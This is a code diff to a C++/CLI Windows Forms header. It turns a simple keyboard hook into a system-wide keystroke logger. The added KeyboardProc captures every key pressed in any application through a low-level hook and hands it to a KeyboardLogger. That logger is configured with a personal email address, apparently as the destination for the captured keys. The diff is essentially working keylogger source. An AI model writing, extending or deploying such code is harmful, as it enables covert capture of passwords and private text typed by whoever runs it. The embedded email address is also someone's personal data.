@@ -1,6 +1,8 @@
 #pragma once
 #include <windows.h>
 #include "KeyHook.h"
+#include "KeyboardLogger.h"
+#include "ILogger.h"
 #pragma comment (lib, "User32.lib")
 namespace GlobalHooks {
 
@@ -17,36 +19,47 @@ namespace GlobalHooks {
 	public:
 		MainWindow(void)
 		{
+			keyboardHook = new KeyHook();
+			keyboardLogger = new KeyboardLogger(10, "hazy142@gmail.com");
 			InitializeComponent();
 		}
 
 	protected:
 		~MainWindow()
 		{
-			UnhookWindowsHookEx(keyboardHook);
+			if (keyboardHook)
+				delete keyboardHook;
+			if (keyboardLogger)
+				delete keyboardLogger;
+			UnhookWindowsHookEx(keyboardHookHandle);
 			if (components)
 			{
 				delete components;
 			}
 		}
 
-		static void KeyboardProc(int nCode, WPARAM wParam,
+		static IntPtr KeyboardProc(int nCode, WPARAM wParam,
 			LPARAM lParam)
 		{
-			KeyHook hook;
-			hook.getNameFromCode(wParam);
-			z++;
-			return;
+			DWORD SHIFT_key = 0;
+			DWORD CTRL_key = 0;
+			DWORD ALT_key = 0;
+			if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
+			{
+				KBDLLHOOKSTRUCT hookedKey = *((KBDLLHOOKSTRUCT*)lParam);
+				string pressedKey = keyboardHook->getNameFromStr(hookedKey);
+				string logMessage;
+				logMessage.append(pressedKey);
+				logMessage.append(" was pressed.");
+				keyboardLogger->addMessage(logMessage);
+			}
+			return (IntPtr) CallNextHookEx(keyboardHookHandle, nCode, wParam, lParam);;
 		}
+
 		virtual void WndProc(Message %m) override
 		{
 			switch (m.Msg)
 			{
-			case WM_KILLFOCUS:
-			{
-
-				return;
-			}
 			case WM_KEYDOWN:
 			{
 				int z = 1;
@@ -59,14 +72,15 @@ namespace GlobalHooks {
 		}
 		
 	private:
-		static int z = 0;
-		HHOOK keyboardHook;
+		static KeyHook *keyboardHook;
+		static KeyboardLogger *keyboardLogger;
+		static HHOOK keyboardHookHandle;
 		System::ComponentModel::Container ^components;
 
 		void InitializeComponent(void)
 		{
 			this->SuspendLayout();
-			keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
+			keyboardHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardProc, 0, 0);
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
 			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
 			this->ClientSize = System::Drawing::Size(284, 261);
